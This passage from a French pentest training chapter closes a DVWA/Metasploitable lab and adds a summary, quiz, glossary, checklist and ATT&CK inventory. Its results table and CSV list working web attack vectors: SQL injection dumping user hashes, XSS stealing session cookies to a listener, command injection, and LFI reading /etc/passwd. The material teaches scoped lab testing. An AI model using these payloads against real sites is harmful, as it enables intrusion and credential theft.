- `scp -r kali@192.168.56.101:/home/kali/preuves/ch1-lab8-v3/. preuves/ch1-lab8-v3/` : copie récursivement le contenu distant.
- `find preuves/ch1-lab8-v3 -type f` : liste les fichiers réguliers.
- `! -name SHA256SUMS` : exclut le fichier de sommes.
- `-print0` et `sort -z` : traitent les noms sans ambiguïté.
- `xargs -0 sha256sum` : calcule les empreintes.
- `> preuves/ch1-lab8-v3/SHA256SUMS` : enregistre les sommes.
- `sha256sum -c` : vérifie chaque fichier ; `OK` signifie que l'empreinte correspond.
- Piège courant : modifier une preuve après le calcul des empreintes ; l'archive n'est plus vérifiable.

**Résultat attendu**

Une suite de `OK` pour chaque fichier. Le fichier `preuves/ch1-lab8-v3/resultats-web.csv` doit contenir les huit lignes de résultats, dont la ligne force brute `N/A`.

**Preuve** — `preuves/ch1-lab8-v3/SHA256SUMS` et `preuves/ch1-lab8-v3/resultats-web.csv`.

#### Étape 12 — Revenir à l'état de référence

**But** — restaurer le snapshot `avant-exploitation` et vérifier que DVWA répond après le rollback.

**Machine** — Kali `192.168.56.101` vers DVWA `192.168.56.103`.

**Prérequis** — snapshot `avant-exploitation` restauré depuis l'interface VirtualBox de l'hôte.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve post-rollback-lab8.txt bash -c 'curl -s -o /dev/null -w "DVWA HTTP %{http_code}\n" http://192.168.56.103/dvwa/login.php; ping -c 2 192.168.56.103'
```

**Explication de la commande**

- `prouve post-rollback-lab8.txt` : enregistre le contrôle de retour à l'état de référence.
- `bash -c '...'` : exécute la séquence dans un shell enfant.
- `curl -s -o /dev/null -w "DVWA HTTP %{http_code}\n"` : interroge DVWA et imprime le code HTTP.
- `ping -c 2 192.168.56.103` : confirme que la cible répond après le rollback.
- Piège courant : lancer `VBoxManage` depuis Kali ; la gestion des VM est réservée à l'hôte.

**Résultat attendu**

```text
DVWA HTTP 200
PING 192.168.56.103 (192.168.56.103) 56(84) bytes of data.
64 bytes from 192.168.56.103: icmp_seq=1 ttl=64 time=0.347 ms
64 bytes from 192.168.56.103: icmp_seq=2 ttl=64 time=0.375 ms

--- 192.168.56.103 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1012ms
rtt min/avg/max/mdev = 0.347/0.361/0.375/0.014 ms
# rc=0
```

Le guestbook XSS est supprimé par la restauration ; les preuves restent sur l'hôte.

**Preuve** — `preuves/ch1-lab8-v3/post-rollback-lab8.txt`.

### En conclusion

Ce lab a démontré cinq vulnérabilités applicatives DVWA et deux exfiltrations : lecture de la table `users` par SQLi manuelle et SQLmap, exécution JavaScript par XSS réfléchi et stocké, injection de commande avec `uid=33(www-data)`, lecture de `/etc/passwd` par LFI, et exfiltration du cookie `PHPSESSID` vers Kali `8000/tcp` dans Chromium. La preuve navigateur distingue l'exécution réelle d'une simple réflexion HTML.

Dans la chaîne d'exploitation, ce lab se situe après l'énumération web (Lab-05) et la qualification des CVE (Lab-06). Il montre le passage de la découverte à l'**accès aux données** et à l'**exfiltration**, tout en restant sur le niveau `low` de DVWA. Le rollback supprime le guestbook XSS et les sessions ; les preuves restent sur l'hôte. La contre-mesure est explicite : requêtes préparées, encodage de sortie, CSP, cookies `HttpOnly`/`Secure`, allowlist de fichiers et moindre privilège.

**Tableau de résultats**

| Vulnérabilité | Vecteur | Statut | Preuve | Résultat |
|---|---|---|---|---|
| SQLi manuelle | `id=1' UNION SELECT user,password FROM users#` | PASS | `03-sqli-union.txt` | 5 comptes et hashes |
| SQLi automatisée | `sqlmap --dbs --tables --dump` | PASS | `09`, `10`, `11` | 7 bases, table `users`, 5 comptes |
| XSS réfléchi | `name=<script>...` | PASS | `04`, `12` | payload non échappé, exécution Chromium, cookie exfiltré |
| XSS stocké | `txtName`/`mtxMessage` | PASS | `05`, `06`, `12` | payload persistant, exécution Chromium, cookie exfiltré |
| Injection de commande | `ip=127.0.0.1; id; hostname; uname -a` | PASS | `07` | `uid=33(www-data)` |
| LFI | `page=../../../../../etc/passwd` | PASS | `08` | `root` et `msfadmin` lus |
| Exfiltration SQLi | `sqlmap -D dvwa -T users --dump` | PASS | `11` | 5 hashes MD5 |
| Exfiltration cookie | XSS + callback `8000/tcp` | PASS | `12`, `00-suite` | `PHPSESSID` et `security=low` reçus |

**`resultats-web.csv`** — le fichier complet :

```csv
cible,application,vulnerabilite,vecteur,commande,statut,preuve,resultat,limite
192.168.56.103,DVWA,SQL injection,GET id,curl UNION SELECT user;password FROM users,PASS,03-sqli-union.txt,5 comptes et hashes affichés,Security low; session admin
192.168.56.103,DVWA,SQL injection,GET id,sqlmap --dbs --tables --dump,PASS,09-sqlmap-dbs.txt;10-sqlmap-tables.txt;11-sqlmap-dump-users.txt,7 bases; table users; 5 comptes exfiltrés,Session admin; security low
192.168.56.103,DVWA,XSS réfléchi,GET name,curl name=<script>alert(document.cookie)</script>,PASS,04-xss-reflected.txt;12-xss-browser.txt,Payload non échappé; exécution Chromium et cookie exfiltré,Security low
192.168.56.103,DVWA,XSS stocké,POST txtName;mtxMessage,curl puis relecture de la page,PASS,05-xss-stored-submit.txt;06-xss-stored-view.txt;12-xss-browser.txt,Payload persistant; exécution Chromium et cookie exfiltré,Security low
192.168.56.103,DVWA,Injection de commande,POST ip,curl ip=127.0.0.1;id;hostname;uname -a,PASS,07-cmdi.txt,uid=33(www-data); metasploitable,Security low
192.168.56.103,DVWA,Inclusion de fichier local,GET page,curl page=../../../../../etc/passwd,PASS,08-lfi.txt,root et msfadmin lus dans /etc/passwd,Security low
192.168.56.103,DVWA,Exfiltration SQLi,GET id,sqlmap -D dvwa -T users -C user;password --dump,PASS,11-sqlmap-dump-users.txt,5 hashes MD5 exfiltrés,Ne pas cracker dans le lab; preuve de lecture suffisante
192.168.56.103,DVWA,Force brute,POST login,non exécuté,N/A,-,Exclu par les règles du lab,Interdit: force brute
```

**Critères de réussite**

- [ ] `00-prerequis.txt` montre `HTTP 200` et les outils disponibles.
- [ ] `01-login.txt` et `02-security-low.txt` montrent une session et `security=low`.
- [ ] `03-sqli-union.txt` contient les cinq comptes et les hashes.
- [ ] `09`, `10` et `11` montrent 7 bases, 2 tables et 5 comptes ; `--answers=crack=N` est utilisé.
- [ ] `04`, `05`, `06` montrent les payloads non échappés et persistants.
- [ ] `07` montre `uid=33(www-data)` ; `08` montre `root` et `msfadmin`.
- [ ] `12-xss-browser.txt` contient au moins un `CALLBACK_PATH` `/reflected?c=` et un `CALLBACK_PATH` `/stored?c=` avec `EXFILTRATED_COOKIE`.
- [ ] `00-suite.txt` contient la suite complète et `# rc=0`.
- [ ] `resultats-web.csv` contient 8 lignes de données, dont la ligne force brute `N/A`.
- [ ] Les preuves sont copiées sur l'hôte et `sha256sum -c` retourne `OK`.
- [ ] Le snapshot `avant-exploitation` est restauré ; DVWA répond ; le guestbook est propre.
- [ ] Aucune force brute, aucun déni de service, aucune persistance, aucune cible hors `192.168.56.0/24`.

## 14. Synthèse et transition

### 14.1 Ce qu'il faut retenir

1. **Une empreinte n'est pas une attaque.** Le Lab-01 observe des ports, des versions et des services. Il ne prouve pas qu'une cible est exploitable.
2. **La version exacte prime sur l'estimation.** Nmap affiche `PostgreSQL 8.3.0 - 8.3.7` ; `psql` donne `8.3.1`. Nmap affiche `Linux 2.6.9 - 2.6.33` ; `uname` donne `2.6.24-16-server`.
3. **Une CVE doit être validée par la version.** ProFTPD `1.3.1` n'est pas dans la plage de CVE-2010-4221. BIND `9.4.2` n'est pas dans `9.4.1 < 9.4.2`. Un résultat de recherche n'est pas une vulnérabilité confirmée.
4. **Un script vide n'est pas une preuve d'absence.** `nfs-showmount` et `rmi-dumpregistry` ne produisent rien dans notre environnement. `showmount -e` et `rpcinfo -p` donnent la réponse pour NFS ; RMI reste non énuméré.
5. **Un outil qui échoue doit être documenté.** `smbmap` échoue avec une `PicklingError` sous Python 3.14. Le fallback `smbclient -L` et `smb-enum-shares` fonctionne.
6. **Le plan précède l'action.** Le plan maître, le PV de gel, le journal et les fiches dry-run encadrent chaque commande. Un plan avec des cases vides n'est pas gelable.
7. **La preuve est datée, complète et hachée.** `# date:`, `# cmd:`, `stdout`, `stderr`, `# rc=`, puis SHA-256. Une capture d'écran sans commande n'est pas une preuve reproductible.
8. **Le risque est une décision, pas un score inventé.** La matrice du Lab-06 utilise une règle qualitative documentée. Elle distingue `critique`, `élevé`, `faible` et `inconnu`.
9. **Les services les plus critiques sont les plus simples.** Le shell root sur `1524`, MySQL `root` sans mot de passe, NFS exporté à `*`, SMB anonyme en `READ/WRITE`. Ces configurations sont plus dangereuses qu'une CVE théorique.
10. **Le périmètre est une règle, pas une intention.** Aucune commande hors `192.168.56.0/24`, aucun déni de service, aucun brute force, aucun accès au shell `1524`. Les exploits autorisés sont ceux de Lab-07, sur la cible isolée, avec snapshot et rollback.
11. **Une CVE n'est « aboutie » que si le résultat est concret.** Une recherche `searchsploit`, une version ou une capture d'écran ne suffisent pas. Il faut une session, une exécution de commande ou une donnée extraite, avec `# rc=0` et une preuve datée. Lab-07 aboutit quatre CVE ; les huit autres sont qualifiées, pas maquillées en succès.
12. **Le XSS se prouve dans un navigateur.** `curl` montre que le payload n'est pas échappé ; Chromium montre qu'il s'exécute. La requête de callback vers Kali `8000/tcp` avec `PHPSESSID` est la preuve de l'exfiltration, pas la simple présence de `<script>` dans le HTML.
13. **L'exfiltration se prouve par un canal contrôlé.** SQLmap extrait les comptes ; le listener XSS reçoit le cookie. Dans les deux cas, la donnée sort de la cible et arrive sur la machine d'attaque, dans un fichier de preuve.
14. **Le rollback fait partie de la preuve.** Après un shell, un XSS stocké ou un dump SQL, la cible doit revenir au snapshot `avant-exploitation`. Un laboratoire laissé contaminé n'est pas reproductible.

### 14.2 Preuves du chapitre

| Lab | Preuves principales | Contrôle |
|---|---|---|
| Lab-01 | `nmap-allports.*`, `nmap-versions.txt`, `nmap-nse-*.txt`, `nmap-os.txt` | `# rc=` par fichier |
| Lab-02 | `searchsploit-*.txt`, `msf-search-vsftpd.txt`, `nmap-meta-versions.xml` | `# rc=` + SHA-256 |
| Lab-03 | `inventaire-techniques.csv`, `navigator-chapitres-1-5.json`, `verifie-lab3.txt` | `RESULTAT: PASS` |
| Lab-04 | `baseline-*.txt`, `session.typescript`, `tcpdump-baseline.pcap`, `dry-run/` | `sha256sum -c` |
| Lab-05 | `ftp-*.txt`, `smb-*.txt`, `mysql-version.txt`, `psql-version.txt`, `x11-access.txt` | `# rc=` par fichier |
| Lab-06 | `cve-*.txt`, `matrice-risques.csv`, `couverture-services.csv`, `SHA256SUMS` | `sha256sum -c` |
| Lab-07 | `exploitation/msf-*.txt`, `cve-CVE-*.txt`, `resultats-cve-v3.csv` | 4 preuves `# rc=0` ; 12 CVE qualifiées ; rollback |
| Lab-08 | `00-suite.txt`, `01-login.txt` à `12-xss-browser.txt`, `resultats-web.csv` | 8 PASS ; cookie exfiltré ; rollback |

Les jeux de preuves de référence sont archivés dans les répertoires de preuves du chapitre. Les répertoires d'essai, les doublons et les versions antérieures ne sont pas des références. Si vous ajoutez des preuves, mettez à jour le tableau et les sommes.

### 14.3 Limites du chapitre

- **Exploitation des CVE validées.** Quatre CVE sont abouties : CVE-2011-2523, CVE-2007-2447, CVE-2010-2075 et CVE-2004-2687. Huit candidates sont qualifiées mais non abouties dans ce périmètre : CVE-2010-4221 (version hors plage), CVE-2011-3192 (DoS interdit), CVE-2012-1823 (CGI 403), CVE-2008-0166 (validation de version), CVE-2008-0600/CVE-2008-0010/CVE-2008-0009 (privesc local non testé) et CVE-2021-4158 (QEMU hôte, hors périmètre).
- **Pas de déni de service.** Les CVE de type DoS sont documentées, jamais testées.
- **Pas de force brute.** Les comptes de test sont utilisés pour lire une version ou se connecter à DVWA, pas pour casser un mot de passe. SQLmap utilise `--answers=crack=N`.
- **Élévation de privilèges locale au chapitre 3.** Les CVE du noyau sont exécutées dans le chapitre 3, sur la VM dédiée et avec snapshot ; le chapitre 1 se concentre sur l'accès réseau initial.
- **Pas de Windows.** Windows Server 2016 et Windows XP sont `N/A` dans ce chapitre. Les labs Active Directory commencent au chapitre 2.
- **Pas d'Internet.** La base Exploit-DB locale est datée. `No Results` signifie « aucun résultat local », pas « aucune vulnérabilité ».
- **Portée du test XSS.** Le test est exécuté sur DVWA `low`, avec `admin`/`password`. Il prouve le mécanisme, pas la facilité d'exploitation d'une application durcie.
- **Versions d'outils.** Les sorties ont été obtenues avec Nmap `7.991`, `searchsploit` de Kali, `nikto 2.6.1`, `gobuster 3.8.2`, `smbmap 1.10.7`, Metasploit de Kali, `sqlmap` de Kali et Chromium/chromedriver du laboratoire. Une version différente peut changer le format, pas la méthode.

### 14.4 Auto-évaluation

Répondez sans relire les explications :

1. Pourquoi `nmap -sS` sans `-n` crashe-t-il sur Kali dans ce laboratoire ?
2. Quelle est la différence entre `nmap -sn` et `nmap -sS -p-` ?
3. Pourquoi `searchsploit -s -t proftpd 1.3.1` ne retourne-t-il rien alors que CVE-2010-4221 existe ?
4. Pourquoi `nmap --script nfs-showmount` vide ne prouve-t-il pas l'absence d'export NFS ?
5. Pourquoi `smbmap` échoue-t-il, et quel est le fallback ?
6. Pourquoi le risque de CVE-2011-2523 est-il `critique` alors que celui de CVE-2010-4221 est `faible` ?
7. Quelles sont les trois composantes d'une preuve reproductible ?
8. Pourquoi le plan maître doit-il être gelé avant la phase 1 ?
9. Pourquoi ne faut-il pas mettre `check` dans `vsftpd.rc` ?
10. Pourquoi `12-xss-browser.txt` est-il une preuve plus forte que `04-xss-reflected.txt` ?
11. Pourquoi SQLmap utilise-t-il `--answers=crack=N` dans ce lab ?
12. Pourquoi seulement quatre CVE sont-elles marquées « abouties » ?

**Réponses courtes :**

1. La version `7.991` de Nmap sur Kali crashe dans `massdns` lors de la résolution DNS ; `-n` désactive la résolution.
2. `-sn` découvre les hôtes actifs sans scanner les ports ; `-sS -p-` scanne les 65 535 ports TCP.
3. La version `1.3.1` est antérieure à la plage `1.3.2 rc3 < 1.3.3b` ; la CVE ne s'applique pas à cette version.
4. Le script peut ne pas gérer l'export ou le service ; `showmount -e` est la source fiable et retourne `/ *`.
5. Incompatibilité entre `smbmap 1.10.7` et Python 3.14 (`PicklingError`) ; fallback `smbclient -L` et `nmap --script smb-enum-shares`.
6. CVE-2011-2523 est une RCE réseau sans authentification sur une version exacte ; CVE-2010-4221 est hors plage pour `1.3.1`.
7. Horodatage, commande exacte, sortie complète (`stdout` + `stderr`) et code retour, puis empreinte SHA-256.
8. Pour figer le périmètre, les prérequis, les preuves attendues et le rollback ; un plan modifié après le gel n'est plus comparable aux preuves.
9. `check` peut déclencher la backdoor et laisser `6200/tcp` ouvert ; `exploit` fait déjà son auto-check et échoue ensuite avec `port already open/in-use`. Le script fourni ne contient pas `check`.
10. `04` prouve que le HTML n'est pas échappé ; `12` prouve que Chromium exécute le JavaScript et envoie le cookie à Kali. La seconde preuve établit l'exécution et l'exfiltration.
11. Pour éviter de casser les hashes MD5 et de transformer un test d'extraction en attaque de mots de passe ; le lab prouve la lecture, pas le crackage.
12. Parce que les quatre CVE ont produit une session et une commande exécutée. Les huit autres sont hors plage, interdites (DoS), non configurables (CGI), non testées (noyau) ou hors périmètre (CVE-2021-4158, QEMU hôte) ; elles sont qualifiées avec preuve, sans faux succès.

### 14.5 Transition vers le chapitre 2

Le chapitre 2 utilise les cibles Metasploitable 2 et les preuves du chapitre 1. Avant de commencer :

- [ ] Le plan maître est gelé et signé.
- [ ] Le snapshot `avant-phase1` existe.
- [ ] Les preuves sont copiées sur l'hôte et hachées.
- [ ] La matrice de risques contient les quatre risques critiques.
- [ ] Les quatre CVE critiques ont une preuve d'aboutissement (`msf-*.txt`, `# rc=0`).
- [ ] Les huit autres CVE sont qualifiées avec justification dans `resultats-cve-v3.csv`.
- [ ] Les tests web ont produit `00-suite.txt`, `12-xss-browser.txt` et `resultats-web.csv`.
- [ ] Aucun shell, listener, tunnel ou session Metasploit ne reste ouvert après le rollback.
- [ ] La cible est revenue au snapshot `avant-exploitation` ; DVWA répond et `6200/tcp` est fermé.
- [ ] Les labs Windows sont marqués `N/A` si les VM ne sont pas déployées.

Le chapitre 2 introduit des techniques d'impact (T1498, T1499) et d'exploitation (T1190, T1203, T1068). Elles restent encadrées par le plan, les snapshots et les règles d'engagement. Le chapitre 1 fournit la référence nécessaire pour distinguer une **observation**, une **qualification** et une **exploitation aboutie**.

## 15. Glossaire

| Terme | Définition |
|---|---|
| **ATT&CK** | Base de connaissances MITRE des tactiques et techniques adverses. |
| **Tactique** | Objectif de haut niveau (`Discovery`, `Impact`, etc.). |
| **Technique** | Méthode utilisée pour atteindre une tactique (`T1046`). |
| **Sous-technique** | Spécialisation d'une technique (`T1499.002`). |
| **TTP** | Tactics, Techniques and Procedures : mode opératoire d'un acteur. |
| **CVE** | Identifiant public d'une vulnérabilité (`CVE-2011-2523`). |
| **EDB-ID** | Identifiant d'un exploit dans Exploit-DB (`16320`). |
| **CVSS** | Cadre de notation de gravité ; non utilisé comme score dans ce chapitre. |
| **NSE** | Nmap Scripting Engine, moteur de scripts Nmap. |
| **CPE** | Common Platform Enumeration, identifiant de produit/version. |
| **SMB** | Server Message Block, protocole de partage de fichiers Windows. |
| **NetBIOS** | API de nommage et de session utilisée par SMB. |
| **NFS** | Network File System, partage de fichiers Unix. |
| **RPC** | Remote Procedure Call, mécanisme d'appel de services distants. |
| **RMI** | Remote Method Invocation, appels de méthodes Java distantes. |
| **AJP** | Apache JServ Protocol, connecteur entre serveur web et Tomcat. |
| **VNC** | Virtual Network Computing, accès graphique distant. |
| **X11** | Système de fenêtrage Unix. |
| **SMTP** | Protocole d'envoi de courriel. |
| **DNS** | Domain Name System. |
| **AXFR** | Transfert de zone DNS complet. |
| **bindshell** | Shell exposé sur un port réseau. |
| **dry-run** | Répétition à blanc d'une étape, sans effet sur la cible. |
| **rollback** | Retour à un état antérieur, généralement par snapshot. |
| **IOC** | Indicateur de compromission. |
| **Baseline** | État de référence d'un système ou d'un réseau. |
| **Snapshot** | Point de restauration d'une VM. |
| **SQLi** | Injection SQL : altération d'une requête par une entrée non validée. |
| **UNION SELECT** | Technique SQLi qui ajoute les colonnes d'une autre table au résultat. |
| **XSS réfléchi** | Exécution JavaScript dans la réponse immédiate à une entrée. |
| **XSS stocké** | Exécution JavaScript persistée dans une base ou un fichier, puis servie aux visiteurs. |
| **LFI** | Local File Inclusion : lecture de fichiers locaux via un paramètre de page. |
| **RCE** | Remote Code Execution : exécution de commandes sur la cible. |
| **Reverse shell** | Shell ouvert de la cible vers la machine d'attaque. |
| **Bind shell** | Shell exposé par la cible sur un port en écoute. |
| **Callback** | Requête sortante déclenchée par le payload et reçue sur un listener contrôlé. |
| **Cookie jar** | Fichier qui conserve et renvoie les cookies d'une session HTTP. |
| **`--answers=crack=N`** | Option SQLmap qui refuse le crackage des hashes pendant le dump. |
| **Selenium** | Bibliothèque de pilotage de navigateur utilisée pour exécuter le JavaScript. |
| **chromedriver** | Pilote qui relie Selenium à Chromium. |

## 16. Checklist de remise

- [ ] `chapitre-01.md` est relu et ne contient aucun caractère d'un autre alphabet.
- [ ] Les huit labs suivent le format : contexte, outils et commandes, étapes avec commande expliquée et résultat attendu, conclusion.
- [ ] Les commandes utilisent les mêmes identifiants, IP et noms de machines que le plan maître.
- [ ] Les preuves sont datées, complètes et hachées ; `sha256sum -c` retourne `OK`.
- [ ] Les scripts NSE sont vérifiés avant usage.
- [ ] Les limites d'outils sont documentées (`smbmap`, `nfs-showmount`, `rmi-dumpregistry`, X11).
- [ ] Les 12 CVE sont qualifiées ; les 11 CVE cibles sont présentes dans Kali et `CVE-2021-4158` est documentée comme CVE QEMU hôte hors périmètre.
- [ ] Les quatre CVE critiques sont abouties avec `msf-*.txt` et `# rc=0` : vsftpd, Samba, UnrealIRCd, distcc.
- [ ] Les huit autres CVE sont qualifiées avec justification dans `resultats-cve-v3.csv`, sans faux succès.
- [ ] La matrice de risques contient 9 lignes et 4 risques critiques.
- [ ] Le plan maître contient 24 entrées et 14 tactiques ; l'avenant A.7 est séparé et documenté.
- [ ] Le contrôle `verifie-lab3.sh` retourne `PASS`.
- [ ] `00-prerequis.txt`, `run-all.txt`, `msf-vsftpd-port6200.txt`, `post-rollback.txt` et `post-rollback-lab8.txt` sont produits et cohérents avec les commandes du chapitre.
- [ ] `01-login.txt` à `12-xss-browser.txt` et `00-suite.txt` sont produits ; le XSS navigateur montre un callback avec `PHPSESSID`.
- [ ] `resultats-web.csv` contient 8 lignes de données, dont la force brute `N/A`.
- [ ] Les scripts de grande taille (`run-cve.sh`, `web-tests.sh`, `xss-browser-test.py`) sont commentés bloc par bloc.
- [ ] Aucun déni de service, aucune force brute, aucune persistance, aucune cible hors `192.168.56.0/24`.
- [ ] Aucun shell, listener ou session Metasploit ne reste ouvert après le rollback ; `6200/tcp` est fermé.
- [ ] La cible est revenue au snapshot `avant-exploitation` ; DVWA répond.
- [ ] Les labs Windows sont marqués `N/A` si les VM ne sont pas déployées.

## Annexe A — Inventaire des techniques (source du CSV)

Cette annexe est la **source de référence** utilisée par `scripts/genere-inventaire.py`. Elle reprend les techniques des chapitres 1 à 5, y compris les techniques `Non applicable` et les identifiants legacy. Le script applique la règle de fusion F-10 et produit `inventaire-techniques.csv`.

> **Lecture** — une ligne peut contenir plusieurs identifiants séparés par `/` (ex. `T1588 / T1588.006`). Le script expanse chaque identifiant et conserve une ligne par identifiant unique. Les identifiants abrégés (`.002`) sont expandus avec leur parent.

#### A.1 Chapitre 1 — Fondations, découverte et planification

| ID | Technique | Tactique | Lab / source | Statut |
|---|---|---|---|---|
| T1016 | System Network Configuration Discovery | Discovery | Ch1 Lab1 | Couvert |
| T1046 | Network Service Discovery | Discovery | Ch1 Lab1, Ch5 Lab4 | Couvert |
| T1588 / T1588.006 | Obtain Capabilities / Vulnerabilities | Resource Development | Ch1 Lab2 | Couvert (recherche passive) |
| T1119 | Automated Collection | Collection | Ch1 Lab4, Ch3 Lab1, Ch4 Lab1 | Couvert (analyse défensive) |
| T1587 / T1587.001 | Develop Capabilities / Malware | Resource Development | Ch3 msfvenom | Couvert (lab) |
| T1027 | Obfuscated Files or Information | Defense Evasion | Ch3 msfvenom | Couvert (lab) |
| T1204 / T1204.002 | User Execution / Malicious File | Execution | Ch3 msfvenom | Exécuté — payload livré et exécuté sur Windows XP |
| T1059.003 / T1059.005 | Windows Command Shell / Visual Basic | Execution | Ch3 msfvenom | T1059.003 exécuté — shell obtenu ; T1059.005 théorique |
| T1059.004 | Unix Shell | Execution | Ch3 Lab1, Ch4 Lab1 | Couvert (analyse) — commandes shell observées dans les journaux |
| T1071 / T1071.001 / T1071.004 | Application Layer Protocol / Web Protocols / DNS | Command and Control | Ch3 Lab2, Ch4 Lab2, Ch4 Lab3 | Couvert (analyse) |
| T1571 | Non-Standard Port | Command and Control | Ch3 Lab2, Ch4 Lab2 | Couvert (analyse) |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | Ch3 Lab3, Ch4 Lab3 | Couvert (analyse) |
| T1040 | Network Sniffing | Credential Access / Discovery | Ch3 Lab2, Ch4 Lab2 | Couvert (analyse) |
| T1083 | File and Directory Discovery | Discovery | Ch3 Lab1, Ch4 Lab1 | Couvert (analyse) |
| T1053.003 | Scheduled Task / Job: Cron | Execution / Persistence / Privilege Escalation | Ch3 Lab3, Ch4 Lab3 | Couvert (analyse) |
| T1069 | Permission Groups Discovery | Discovery | Ch5 Lab1 | Couvert (audit) |
| T1069.002 | Domain Groups | Discovery | — | Non applicable — labs Linux sans Active Directory |
| T1490 | Inhibit System Recovery | Impact | Ch4 Lab4 (référence) | Non applicable — la restauration est une remédiation, pas T1490 |
| T1485 | Data Destruction | Impact | Ch4 Lab4 (référence) | Non applicable — aucun lab de destruction ; la restauration est une remédiation |
| T1566 / T1566.001 | Phishing / Spearphishing Attachment | Initial Access | — | Non applicable — aucun lab de phishing |
| T1047 | Windows Management Instrumentation | Execution | — | Non applicable — les labs Ch3/Ch4 analysent des journaux Linux, pas WMI |
| T1056 / T1056.001 | Input Capture / Keylogging | Collection / Credential Access | — | Non applicable — aucun keylogging observé |
| T1036 | Masquerading | Defense Evasion | — | Non applicable — aucun lab de masquerading ; l'audit pare-feu relève de T1562.004 |
| T1082 | System Information Discovery | Discovery | — | Non applicable — retiré de la couverture : aucune commande `uname`, `hostname` ou `whoami` dans Ch1 Lab1 |

#### A.2 Chapitre 2 — Attaques avancées et Active Directory

| ID | Technique | Tactique | Lab / source | Statut |
|---|---|---|---|---|
| T1498 | Network Denial of Service | Impact | Ch2 Lab1 | Couvert (simulation) |
| T1499 | Endpoint Denial of Service | Impact | Ch2 Lab1 | Couvert (simulation) |
| T1499.001 / .002 / .003 / .004 | OS Exhaustion Flood / Service Exhaustion Flood / Application Exhaustion Flood / Application or System Exploitation | Impact | Ch2 Lab1 | Théorique — non exécuté |
| T1190 | Exploit Public-Facing Application | Initial Access | Ch2 Lab2 | Couvert (simulation) |
| T1203 | Exploitation for Client Execution | Execution | Ch2 Lab2 | Théorique — charge utile générée, non exécutée |
| T1068 | Exploitation for Privilege Escalation | Privilege Escalation | Ch2 Lab2, Ch3 Lab2, Ch5 Lab5 | Exécuté — Ch3 Lab2 (élévation locale) |
| T1003 / T1003.002 / T1003.003 | OS Credential Dumping / Security Account Manager / NTDS | Credential Access | Ch2 Lab3 | Théorique — procédure décrite, non exécutée |
| T1550 / T1550.002 | Use Alternate Authentication Material / Pass the Hash | Defense Evasion / Lateral Movement | Ch2 Lab3 | Théorique — simulation avec hash factice |
| T1110 / T1110.001 | Brute Force / Password Guessing | Credential Access | Ch2 Lab3 | Couvert (simulation) |
| T1110.002 / T1110.003 | Password Cracking / Password Spraying | Credential Access | Ch2 Lab3 | Théorique — non exécuté |
| T1087.002 | Domain Account Discovery | Discovery | Ch2 Lab3 | Théorique — non exécuté |
| T1018 | Remote System Discovery | Discovery | Ch2 Lab3 | Théorique — non exécuté |
| T1021.002 | SMB/Windows Admin Shares | Lateral Movement | Ch2 Lab3 | Théorique — support de Pass-the-Hash |
| T1482 | Domain Trust Discovery | Discovery | Ch2 Lab3 | Théorique — non exécuté |
| T1558.003 / T1558.004 | Kerberoasting / AS-REP Roasting | Credential Access | Ch2 Lab3 | Théorique — non exécuté |

#### A.3 Chapitre 3 — Payloads, C2 et analyse

| ID | Technique | Tactique | Lab / source | Statut |
|---|---|---|---|---|
| T1587 / T1587.001 | Develop Capabilities / Malware | Resource Development | Ch3 msfvenom | Couvert (lab) |
| T1027 | Obfuscated Files or Information (encodage `shikata_ga_nai`) | Defense Evasion | Ch3 msfvenom | Couvert (lab) |
| T1204 / T1204.002 | User Execution / Malicious File | Execution | Ch3 msfvenom | Exécuté — payload livré et exécuté sur Windows XP |
| T1059.003 / T1059.005 | Windows Command Shell / Visual Basic | Execution | Ch3 msfvenom | T1059.003 exécuté — shell obtenu ; T1059.005 théorique |
| T1071 / T1071.001 | Application Layer Protocol / Web Protocols | Command and Control | Ch3 Lab2 | Couvert (analyse) |
| T1571 | Non-Standard Port | Command and Control | Ch3 Lab2 | Couvert (analyse) |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | Ch3 Lab3 | Couvert (analyse) |
| T1053.003 | Scheduled Task / Job: Cron | Execution / Persistence / Privilege Escalation | Ch3 Lab3 | Couvert (analyse) |
| T1119 | Automated Collection | Collection | Ch3 Lab1 | Couvert (analyse défensive) |
| T1083 | File and Directory Discovery | Discovery | Ch3 Lab1 | Couvert (analyse) |
| T1040 | Network Sniffing | Credential Access / Discovery | Ch3 Lab2 | Couvert (analyse) |
| T1046 | Network Service Discovery | Discovery | — | Non applicable — aucun scan de ports dans Ch3 |
| T1069 | Permission Groups Discovery | Discovery | — | Non applicable — aucune énumération de groupes dans Ch3 |
| T1047 | Windows Management Instrumentation | Execution | — | Non applicable — pas de WMI dans les labs Linux |
| T1056 / T1056.001 | Input Capture / Keylogging | Collection / Credential Access | — | Non applicable — aucun keylogging observé |

#### A.4 Chapitre 4 — Forensique, réseau, rapport et restauration

| ID | Technique | Tactique | Lab / source | Statut |
|---|---|---|---|---|
| T1119 | Automated Collection | Collection | Ch4 Lab1 | Couvert (analyse défensive) |
| T1083 | File and Directory Discovery | Discovery | Ch4 Lab1 | Couvert (analyse) |
| T1059.004 | Unix Shell | Execution | Ch4 Lab1 | Couvert (analyse) — commandes shell observées dans les journaux |
| T1040 | Network Sniffing | Credential Access / Discovery | Ch4 Lab2 | Couvert (analyse) |
| T1071 / T1071.001 | Application Layer Protocol / Web Protocols | Command and Control | Ch4 Lab2, Ch4 Lab3 | Couvert (analyse) |
| T1571 | Non-Standard Port | Command and Control | Ch4 Lab2 | Couvert (analyse) |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | Ch4 Lab3 | Couvert (analyse) |
| T1053.003 | Scheduled Task / Job: Cron | Execution / Persistence / Privilege Escalation | Ch4 Lab3 | Couvert (analyse) |
| T1490 | Inhibit System Recovery | Impact | Ch4 Lab4 (référence) | Non applicable — la restauration de snapshot est une remédiation, pas T1490 |
| T1485 | Data Destruction | Impact | Ch4 Lab4 (référence) | Non applicable — aucun lab de destruction |
| T1566 | Phishing | Initial Access | — | Non applicable — aucun lab de phishing |
| T1046 | Network Service Discovery | Discovery | Ch4 Lab4 (vérification) | Couvert (vérification) — scan de contrôle après restauration |
| T1069 | Permission Groups Discovery | Discovery | — | Non applicable — aucune énumération de groupes dans Ch4 |
| T1056 / T1056.001 | Input Capture / Keylogging | Collection / Credential Access | — | Non applicable — aucun keylogging observé |
